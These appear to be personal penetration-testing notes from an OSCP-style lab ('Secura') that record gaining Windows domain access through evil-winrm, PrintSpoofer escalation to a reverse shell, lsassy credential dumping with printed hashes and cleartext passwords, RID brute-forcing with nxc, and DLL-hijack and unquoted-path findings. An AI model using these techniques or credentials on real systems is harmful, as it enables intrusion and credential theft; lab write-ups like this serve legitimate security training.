ip 3: 192.168.175.95 (GIVEN)
Eric.Wallows
EricLikesRunning800

evilwinrm and run printspoofer to get proof.txt  
<img width="587" height="198" alt="image" src="https://github.com/user-attachments/assets/0ad72647-1a7f-49f8-b626-a64bf1928cfb" />

running  
postgres(8096)[C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin\postgres.exe] -- POwn: SYSTEM
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin (Administrators [Allow: AllAccess])
    Command Line: "C:/Program Files/ManageEngine/AppManager14/working/pgsql/bin/postgres.exe" "--forkboot" "5300" "-x5"

lsassy to dump creds.
<img width="1400" height="153" alt="image" src="https://github.com/user-attachments/assets/4cbffe7a-2181-43d7-b030-c7cb0dae04f0" />
SECURE\Administrator a51493b0b06e5e35f855245e71af1d14
LSASSY      192.168.175.95  445    SECURE           era.secura.local\apache New2Era4.!
LSASSY      192.168.175.95  445    SECURE           SECURE\cloudbase-init 73d8971412880a26da1c3f98e98beeed

└─$ nxc smb 192.168.175.96 -u Eric.Wallows -p EricLikesRunning800 --rid-brute | awk -F'\\' '{print $2}' | awk '{print $1}' > users                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/oscp/challenge/secura]
└─$ cat users                            
Eric.Wallows:EricLikesRunning800
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
None
apache
cloudbase-init
Admin  

idk why does this work but i guess im in 96
<img width="1837" height="314" alt="image" src="https://github.com/user-attachments/assets/b0abfd7b-807c-4b10-9f52-1a367c70e5bb" />

 MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected  

 creds file i found charlottes password  Game2On4.!
 <img width="1907" height="182" alt="image" src="https://github.com/user-attachments/assets/e0319126-2859-4069-8f3c-a0c5b70a66e8" />


administrator password  'Almost4There8.?'
<img width="1121" height="226" alt="image" src="https://github.com/user-attachments/assets/91e9d150-1dab-41e9-8484-4c9503ddda9e" />

ip1  
Eric.Wallows:EricLikesRunning800
Enterprise
Administrator
Guest
krbtgt
DefaultAccount
Domain
Domain
Domain
Domain
Domain
Cert
Schema
Enterprise
Group
Read-only
Cloneable
Protected
Key
Enterprise
RAS
Allowed
Denied
DC01$
DnsAdmins
DnsUpdateProxy
michael
charlotte
SECURE$
ERA$

use charlotte credential  
<img width="1112" height="214" alt="image" src="https://github.com/user-attachments/assets/2244fc51-54ba-41f8-92dc-3961a5472c5e" />

printspoofer  
./PrintSpoofer64.exe -c reverse.exe
the normal -i -c didnt work
<img width="1165" height="109" alt="image" src="https://github.com/user-attachments/assets/adcb84d2-d338-4e13-8a3e-2447a77e0aa1" />

